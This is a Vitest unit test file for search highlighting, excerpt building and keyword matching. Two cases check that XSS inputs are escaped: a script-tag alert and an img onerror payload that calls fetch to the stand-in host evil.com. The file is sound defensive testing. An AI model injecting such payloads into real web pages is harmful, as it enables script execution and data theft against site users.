import { describe, expect, it } from 'vitest';
import { highlightText, buildSearchExcerpt, containsKeyword } from './searchPresentation';

describe('highlightText', () => {
  it('should return empty string for empty source', () => {
    expect(highlightText('', 'keyword')).toBe('');
  });

  it('should return escaped source when no keyword', () => {
    expect(highlightText('hello <world>', '')).toBe('hello &lt;world&gt;');
  });

  it('should wrap matched term in mark tag', () => {
    const result = highlightText('hello world', 'world');
    expect(result).toContain('<mark class="search-highlight">');
    expect(result).toContain('world');
  });

  it('should escape HTML in source text', () => {
    const result = highlightText('<script>alert("xss")</script>', 'alert');
    expect(result).not.toContain('<script>');
    expect(result).toContain('&lt;script&gt;');
    expect(result).toContain('<mark class="search-highlight">alert</mark>');
  });

  it('should escape HTML in img onerror vector', () => {
    const result = highlightText('<img onerror="fetch(\'https://evil.com\')" src=x>', 'onerror');
    expect(result).not.toContain('<img');
    expect(result).toContain('&lt;img');
    expect(result).toContain('<mark class="search-highlight">onerror</mark>');
  });

  it('should handle regex special characters in keyword', () => {
    const result = highlightText('price is $10.00', '$10.00');
    expect(result).toContain('<mark class="search-highlight">$10.00</mark>');
  });

  it('should handle keyword with brackets', () => {
    const result = highlightText('array[0] + array[1]', '[0]');
    expect(result).toContain('<mark class="search-highlight">[0]</mark>');
  });

  it('should handle keyword with pipes and parens', () => {
    const result = highlightText('foo|(bar)', '(bar)');
    expect(result).toContain('<mark class="search-highlight">(bar)</mark>');
  });

  it('should be case insensitive', () => {
    const result = highlightText('Hello World', 'world');
    expect(result).toContain('<mark class="search-highlight">World</mark>');
  });

  it('should escape HTML in matched portions', () => {
    const result = highlightText('<b>bold</b>', '<b>');
    expect(result).not.toContain('&lt;<mark');
    expect(result).toMatch(/&lt;b&gt;bold&lt;\/b&gt;/);
  });
});

describe('buildSearchExcerpt', () => {
  it('should return empty for empty text', () => {
    expect(buildSearchExcerpt('', 'key')).toBe('');
  });

  it('should return truncated text with ellipsis when no keyword match', () => {
    const long = 'a'.repeat(200);
    const result = buildSearchExcerpt(long, 'z', 100);
    expect(result.length).toBeLessThanOrEqual(104);
    expect(result.endsWith('…')).toBe(true);
  });

  it('should include context around matched keyword', () => {
    const text = 'this is a very long text with the keyword embedded in the middle';
    const result = buildSearchExcerpt(text, 'keyword', 60);
    expect(result).toContain('keyword');
  });
});

describe('containsKeyword', () => {
  it('should return true when keyword is found', () => {
    expect(containsKeyword('Hello World', 'world')).toBe(true);
  });

  it('should return false when keyword is not found', () => {
    expect(containsKeyword('Hello World', 'foo')).toBe(false);
  });

  it('should return false for empty inputs', () => {
    expect(containsKeyword('', 'key')).toBe(false);
    expect(containsKeyword('text', '')).toBe(false);
  });
});
